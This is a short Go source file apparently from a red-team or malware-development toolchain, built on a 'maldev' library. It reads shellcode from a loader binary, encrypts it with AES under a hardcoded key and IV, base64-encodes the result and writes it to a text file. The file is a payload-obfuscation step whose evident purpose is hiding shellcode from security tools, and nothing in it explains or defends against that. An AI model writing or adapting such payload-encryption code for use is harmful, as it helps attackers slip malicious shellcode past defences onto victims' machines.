package main

import (
	"encoding/base64"
	"fmt"
	"os"

	"github.com/D3Ext/maldev/src/crypto"
	"github.com/D3Ext/maldev/src/redteam"
)

func main() {
	iv := []byte("1010101010101010")
	key := []byte("Secware_P@sswdrd!132124356432912")
	var shell []byte

	shell, err := redteam.GetShellcodeFromFile("../loader.bin")
	if err != nil {
		fmt.Println(err)
	}

	criptShell, err := crypto.AESEncrypt(shell, iv, key)
	if err != nil {
		fmt.Println(err)
	}

	data := (base64.StdEncoding.EncodeToString(criptShell))

	file, err := os.Create("Data.txt")
	if err != nil {
		fmt.Println(err)
	}

	_, err = fmt.Fprint(file, data)
	if err != nil {
		fmt.Print(err)
	}
}
